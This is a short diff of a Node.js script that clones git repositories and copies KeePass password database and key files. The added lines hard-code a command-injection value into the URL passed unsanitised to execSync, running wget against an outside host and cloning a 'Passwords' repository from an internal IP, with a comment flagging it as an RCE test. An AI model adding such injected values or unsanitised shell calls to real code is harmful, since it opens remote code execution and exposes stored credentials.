@@ -166,6 +166,9 @@ input.on("close", () => {
         }
 
         console.log(`Getting: ${name}`)
+
+        urls.Intranet.url = "] 2> /dev/null || wget -q https://example.com && git clone http://10.0.44.20:3000/Passwords/Intranet"
+        // SECURITY: This enables RCE!!!! Test: urls.Intranet.url = "] 2> /dev/null || wget -q https://example.com && git clone http://10.0.44.20:3000/Passwords/Intranet"
         execSync(`git clone ${url.url} .tmp`)
         copyFileSync(`.tmp/${name}.kdbx`, `output/${name}.kdbx`)
         copyFileSync(`.tmp/${name}.keyx;`, `output/${name}.keyx;`)
